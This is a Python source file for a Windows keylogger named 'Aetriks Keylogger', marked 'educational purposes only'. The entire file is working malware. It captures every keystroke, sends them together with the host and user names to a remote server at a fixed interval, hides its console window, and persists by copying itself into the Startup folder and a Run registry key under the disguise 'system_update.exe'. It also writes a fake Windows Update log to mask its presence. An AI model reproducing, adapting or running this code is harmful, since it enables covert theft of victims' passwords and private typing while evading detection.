#!/usr/bin/env python3
"""
Aetriks Keylogger - Advanced Python Keylogger for Windows
Captures keystrokes and sends them to a Linux server with stealth capabilities.

DISCLAIMER: This is for educational purposes only.
Use only on systems you own or have explicit permission to test.
"""

import json
import time
import requests
import threading
import os
import sys
import base64
import winreg
import ctypes
from pynput import keyboard
from pynput.keyboard import Key
from datetime import datetime
import subprocess
import tempfile
import shutil

class AetriksKeylogger:
    def __init__(self):
        self.config = self.load_config()
        self.keystrokes = []
        self.lock = threading.Lock()
        self.running = True
        self.session_id = self.generate_session_id()
        self.startup_enabled = False
        
    def load_config(self):
        """Load configuration from config.json"""
        try:
            config_path = os.path.join(os.path.dirname(__file__), 'config.json')
            with open(config_path, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            print("[ERROR] config.json not found. Using default configuration.")
            return {
                "ip_address": "127.0.0.1",
                "port_number": 8080,
                "time_interval": 10,
                "stealth_mode": True,
                "persistence": True,
                "log_file": "system_log.txt"
            }
        except json.JSONDecodeError:
            print("[ERROR] Invalid JSON in config.json. Using default configuration.")
            return {
                "ip_address": "127.0.0.1",
                "port_number": 8080,
                "time_interval": 10,
                "stealth_mode": True,
                "persistence": True,
                "log_file": "system_log.txt"
            }
    
    def generate_session_id(self):
        """Generate unique session identifier"""
        import uuid
        return str(uuid.uuid4())[:8]
    
    def is_admin(self):
        """Check if running with administrator privileges"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def enable_persistence(self):
        """Enable automatic startup on system boot"""
        if not self.is_admin():
            return False
            
        try:
            # Create a copy in a hidden location
            current_path = os.path.abspath(sys.argv[0])
            startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            target_path = os.path.join(startup_path, 'system_update.exe')
            
            # Copy executable to startup folder
            shutil.copy2(current_path, target_path)
            
            # Add to registry for additional persistence
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, target_path)
                winreg.CloseKey(key)
                self.startup_enabled = True
                return True
            except Exception as e:
                print(f"[WARNING] Registry persistence failed: {e}")
                return False
                
        except Exception as e:
            print(f"[ERROR] Persistence setup failed: {e}")
            return False
    
    def disable_persistence(self):
        """Remove persistence mechanisms"""
        try:
            # Remove from registry
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.DeleteValue(key, "SystemUpdate")
            winreg.CloseKey(key)
            
            # Remove startup file
            startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            target_path = os.path.join(startup_path, 'system_update.exe')
            if os.path.exists(target_path):
                os.remove(target_path)
                
            self.startup_enabled = False
            return True
        except Exception as e:
            print(f"[ERROR] Failed to remove persistence: {e}")
            return False
    
    def hide_console(self):
        """Hide console window in stealth mode"""
        if self.config.get('stealth_mode', True):
            try:
                import win32gui
                import win32con
                hwnd = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            except ImportError:
                # Fallback method
                try:
                    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
                except:
                    pass
    
    def on_key_press(self, key):
        """Handle key press events"""
        try:
            with self.lock:
                if hasattr(key, 'char'):
                    # Regular character key
                    self.keystrokes.append(key.char)
                elif key == Key.space:
                    self.keystrokes.append(' ')
                elif key == Key.enter:
                    self.keystrokes.append('\n')
                elif key == Key.backspace:
                    if self.keystrokes:
                        self.keystrokes.pop()
                elif key == Key.tab:
                    self.keystrokes.append('\t')
                elif key == Key.ctrl_l or key == Key.ctrl_r:
                    self.keystrokes.append('[CTRL]')
                elif key == Key.alt_l or key == Key.alt_r:
                    self.keystrokes.append('[ALT]')
                elif key == Key.shift:
                    self.keystrokes.append('[SHIFT]')
                else:
                    # Special keys
                    self.keystrokes.append(f'[{key}]')
        except Exception as e:
            if not self.config.get('stealth_mode', True):
                print(f"[ERROR] Error processing key press: {e}")
    
    def on_key_release(self, key):
        """Handle key release events"""
        if key == Key.f12:  # Use F12 as stealth stop key
            if self.config.get('stealth_mode', True):
                self.running = False
                return False
    
    def send_data(self):
        """Send captured keystrokes to server"""
        while self.running:
            try:
                with self.lock:
                    if self.keystrokes:
                        data = ''.join(self.keystrokes)
                        self.keystrokes = []
                    else:
                        data = ""
                
                if data:
                    # Add metadata to payload
                    payload = {
                        "keyboardData": data,
                        "session_id": self.session_id,
                        "timestamp": datetime.now().isoformat(),
                        "hostname": os.environ.get('COMPUTERNAME', 'Unknown'),
                        "username": os.environ.get('USERNAME', 'Unknown')
                    }
                    
                    url = f"http://{self.config['ip_address']}:{self.config['port_number']}/api/keystrokes"
                    
                    response = requests.post(
                        url,
                        json=payload,
                        headers={'Content-Type': 'application/json'},
                        timeout=5
                    )
                    
                    if response.status_code == 200:
                        if not self.config.get('stealth_mode', True):
                            print(f"[INFO] Data sent successfully: {len(data)} characters")
                    else:
                        if not self.config.get('stealth_mode', True):
                            print(f"[ERROR] Server returned status code: {response.status_code}")
                        
            except requests.exceptions.ConnectionError:
                if not self.config.get('stealth_mode', True):
                    print(f"[ERROR] Cannot connect to server at {self.config['ip_address']}:{self.config['port_number']}")
            except requests.exceptions.Timeout:
                if not self.config.get('stealth_mode', True):
                    print("[ERROR] Request timeout")
            except Exception as e:
                if not self.config.get('stealth_mode', True):
                    print(f"[ERROR] Error sending data: {e}")
            
            # Wait before next transmission
            time.sleep(self.config['time_interval'])
    
    def create_log_file(self):
        """Create a legitimate-looking log file for stealth"""
        try:
            log_content = f"""
System Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Windows Update Service
Service started successfully
Monitoring system performance
Memory usage: Normal
CPU usage: Normal
Network connectivity: Active
Security status: Protected
            """
            
            log_path = os.path.join(os.environ.get('TEMP', ''), self.config.get('log_file', 'system_log.txt'))
            with open(log_path, 'w') as f:
                f.write(log_content)
                
        except Exception as e:
            pass
    
    def start(self):
        """Start the keylogger"""
        if not self.config.get('stealth_mode', True):
            print("[INFO] Aetriks Keylogger starting...")
            print(f"[INFO] Server: {self.config['ip_address']}:{self.config['port_number']}")
            print(f"[INFO] Transmission interval: {self.config['time_interval']} seconds")
            print("[INFO] Press F12 to stop the keylogger (stealth mode)")
        else:
            # Hide console in stealth mode
            self.hide_console()
        
        # Enable persistence if configured
        if self.config.get('persistence', True) and self.is_admin():
            self.enable_persistence()
        
        # Create stealth log file
        self.create_log_file()
        
        # Start data transmission thread
        transmission_thread = threading.Thread(target=self.send_data, daemon=True)
        transmission_thread.start()
        
        # Start keyboard listener
        with keyboard.Listener(
            on_press=self.on_key_press,
            on_release=self.on_key_release
        ) as listener:
            listener.join()
        
        if not self.config.get('stealth_mode', True):
            print("[INFO] Keylogger stopped.")

def main():
    """Main function"""
    try:
        keylogger = AetriksKeylogger()
        keylogger.start()
    except KeyboardInterrupt:
        if not keylogger.config.get('stealth_mode', True):
            print("\n[INFO] Keylogger interrupted by user.")
    except Exception as e:
        if not keylogger.config.get('stealth_mode', True):
            print(f"[ERROR] Unexpected error: {e}")

if __name__ == "__main__":
    main() 